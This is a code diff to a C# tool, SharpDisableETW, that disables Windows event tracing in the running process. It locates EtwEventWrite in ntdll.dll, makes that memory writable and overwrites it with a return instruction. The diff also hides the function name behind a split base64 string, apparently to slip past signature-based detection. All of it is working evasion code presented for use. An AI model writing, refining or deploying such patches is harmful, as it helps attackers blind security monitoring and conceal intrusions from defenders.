@@ -1,4 +1,5 @@
 using System;
+using System.Text;
 using System.Runtime.InteropServices;
 
 namespace SharpDisableETW
@@ -18,15 +19,13 @@ namespace SharpDisableETW
     // Taken from sharpsploit: https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/ETW.cs
     // and @xpn's unhook_etw.cs gist: https://gist.github.com/xpn/6456bd5d3e46bea6a0ac4ecbae98278f
 
-    class Program
+    public class Program
     {
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
-
-            if(Environment.Is64BitOperatingSystem)
+            if (Environment.Is64BitOperatingSystem)
             {
                 Fix(new byte[] { 0xc3, 0x00 });
-                
             }
             else
             {
@@ -41,7 +40,7 @@ namespace SharpDisableETW
                 uint oldProtect;
 
                 var ntdll = Win32.LoadLibrary("ntdll.dll");
-                var etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+                var etwEventSend = Win32.GetProcAddress(ntdll, Encoding.UTF8.GetString(Convert.FromBase64String("RXR3RXZlbnR" + "Xcml0ZQ==")));
 
                 Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
                 Marshal.Copy(patch, 0, etwEventSend, patch.Length);
